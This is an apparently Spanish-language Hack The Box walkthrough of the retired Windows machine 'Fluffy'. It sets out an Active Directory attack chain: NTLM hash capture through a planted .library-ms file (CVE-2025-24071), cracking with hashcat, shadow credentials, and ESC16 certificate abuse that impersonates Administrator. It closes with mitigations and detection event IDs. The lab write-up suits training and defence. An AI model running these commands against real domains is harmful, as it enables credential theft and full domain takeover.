---
machine: Fluffy
os: Windows
difficulty: Easy
platform: Hack The Box
category: Active Directory
state: Retired
tags: [windows, active-directory, ntlm-theft, cve-2025-24071, shadow-credentials, adcs, esc16]
---

# Fluffy — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

Escenario de *assumed breach*: nos dan credenciales de un usuario de bajo privilegio (`j.fleischman`). Un recurso compartido SMB escribible permite plantar un fichero `.library-ms` y capturar el hash NTLMv2 de otro usuario (CVE-2025-24071). Con `p.agila` se ven ACLs sobre `winrm_svc` y `ca_svc`: *shadow credentials* para entrar por WinRM y **ESC16** sobre la CA para emitir un certificado de Administrator.

## Reconocimiento

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

DC con 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 5985 y 9389. Dominio `fluffy.htb`, host `DC01.fluffy.htb`.

```bash
nxc smb <IP> -u j.fleischman -p '<password>' --shares
nxc smb <IP> -u j.fleischman -p '<password>' --users
```

El share `IT` es escribible y contiene documentación interna con otro nombre de usuario: `p.agila`.

## Enumeración

- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».

## Foothold

1. **Robo de NTLM (CVE-2025-24071)**: se genera un `.library-ms` que apunta a nuestro listener y se sube al share. Al abrirlo el usuario víctima autentica contra nosotros.

```bash
responder -I tun0 -wv
# subir el .library-ms al share IT
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

2. **Enumeración con `p.agila`**:

```bash
bloodhound-python -u p.agila -p '<password>' -d fluffy.htb -ns <IP> -c all
nxc ldap <IP> -u p.agila -p '<password>' --bloodhound --collection All
```

BloodHound muestra `GenericWrite`/ACLs sobre `winrm_svc` y sobre `ca_svc`.

3. **Shadow credentials sobre `winrm_svc`**:

```bash
certipy shadow auto -u p.agila@fluffy.htb -p '<password>' -account winrm_svc -dc-ip <IP>
evil-winrm -i dc01.fluffy.htb -u winrm_svc -H <hash>
```

## Movimiento lateral

- La cadena reutiliza credenciales dentro del mismo host; no hay salto a un segundo equipo.
- El detalle está en «Escalada de privilegios».

## Escalada de privilegios

La CA tiene **ESC16**: la extensión de seguridad está deshabilitada en la plantilla, así que un certificado emitido a `ca_svc` se puede reutilizar cambiando el UPN.

```bash
certipy find -u ca_svc@fluffy.htb -hashes <hash> -dc-ip <IP> -vulnerable -stdout
# ESC16: Disabled Extensions = 1.3.6.1.4.1.311.25.2
```

```bash
# 1. UPN de ca_svc → administrator
bloodyAD -u ca_svc -p '<password>' -d fluffy.htb --host <IP> set object ca_svc userPrincipalName -v administrator@fluffy.htb

# 2. Pedir certificado y autenticar
certipy req -u ca_svc@fluffy.htb -hashes <hash> -ca FLUFFY-CA -template User -dc-ip <IP>
certipy auth -pfx administrator.pfx -dc-ip <IP> -username administrator -domain fluffy.htb

# 3. Revertir el UPN
```

```bash
evil-winrm -i dc01.fluffy.htb -u administrator -H <hash_admin>
```

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- El `.library-ms` hay que subirlo con la ruta UNC correcta y Responder escuchando en la interfaz de la VPN.
- `certipy auth` puede fallar por desfase horario: usar `faketime` o sincronizar.
- Revertir el UPN de `ca_svc` al terminar, o la CA queda inconsistente.
- La contraseña inicial se da en el enunciado; no hace falta fuerza bruta.

- Un share escribible más un formato que fuerza autenticación es robo de credenciales.
- Las ACLs encadenadas (`GenericWrite` sobre cuentas de servicio) convierten un usuario normal en administrador de la CA.
- ESC16: deshabilitar la extensión de seguridad permite cambiar el UPN y suplantar a cualquier principal.
- Mitigación: bloquear NTLM saliente, revisar ACLs sobre cuentas de servicio y habilitar la extensión de seguridad en las plantillas.

## Mitigaciones y detección

- Firmar SMB, deshabilitar SMBv1 y limitar los shares administrativos por grupo.
- Detección: 5140/5145 anómalos y 4624 tipo 3 con NTLM desde hosts no administrativos.

## Referencias

- [CVE-2025-24071](https://nvd.nist.gov/vuln/detail/CVE-2025-24071)
- [adcs-esc13](../../../knowledge/windows/adcs-esc13.md)
